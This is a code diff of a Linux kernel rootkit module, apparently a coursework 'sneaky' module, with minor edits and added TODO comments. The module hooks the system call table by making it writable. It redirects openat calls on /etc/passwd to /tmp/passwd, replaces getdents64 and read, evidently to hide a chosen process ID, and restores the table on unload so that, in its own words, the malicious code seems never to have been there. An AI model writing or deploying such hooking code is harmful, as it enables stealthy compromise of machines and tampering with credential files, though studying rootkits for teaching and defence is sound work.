@@ -15,6 +15,7 @@
 //This is a pointer to the system call table
 static unsigned long *sys_call_table;
 
+// TODO:
 static char * sneaky_pid = "\0";
 module_param(sneaky_pid, charp, 0);
 MODULE_PARM_DESC(sneaky_pid, "pid of sneaky process");
@@ -24,8 +25,8 @@ MODULE_PARM_DESC(sneaky_pid, "pid of sneaky process");
 int enable_page_rw(void *ptr){
   unsigned int level;
   pte_t *pte = lookup_address((unsigned long) ptr, &level);
-  if(pte->pte & ~_PAGE_RW){
-    pte->pte |= _PAGE_RW;
+  if(pte->pte &~_PAGE_RW){
+    pte->pte |=_PAGE_RW;
   }
   return 0;
 }
@@ -51,14 +52,14 @@ asmlinkage int sneaky_sys_openat(struct pt_regs * regs)
 
   copy_from_user(buffer, filename, 12);
   if (strcmp(buffer, "/etc/passwd") == 0) {
-    copy_to_user((void *) filename, "/tmp/passwd", 12);
+    const char *modifiedFilename = "/tmp/passwd";
+    copy_to_user((void *) filename, modifiedFilename, 12);
   }
   
   return (*original_openat)(regs);
 }
 
-// static asmlinkage int (*original_getdents64)(unsigned int fd, struct linux_dirent64 * dirp, unsigned int count);
-
+// TODO: 下面基本全是
 static asmlinkage int (*original_getdents64)(struct pt_regs * regs);
 
 asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs) {
@@ -152,6 +153,7 @@ static int initialize_sneaky_module(void)
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
   original_openat = (void *) sys_call_table[__NR_openat];
+  // TODO:
   original_getdents64 = (void *) sys_call_table[__NR_getdents64];
   original_read = (void *) sys_call_table[__NR_read];
   
@@ -159,6 +161,7 @@ static int initialize_sneaky_module(void)
   enable_page_rw((void *)sys_call_table);
   
   sys_call_table[__NR_openat] = (unsigned long) sneaky_sys_openat;
+  // TODO:
   sys_call_table[__NR_getdents64] = (unsigned long) sneaky_sys_getdents64;
   sys_call_table[__NR_read] = (unsigned long) sneaky_sys_read;
 
@@ -180,6 +183,7 @@ static void exit_sneaky_module(void)
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was never there!
   sys_call_table[__NR_openat] = (unsigned long) original_openat;
+  // TODO:
   sys_call_table[__NR_getdents64] = (unsigned long) original_getdents64;
   sys_call_table[__NR_read] = (unsigned long) original_read;
 
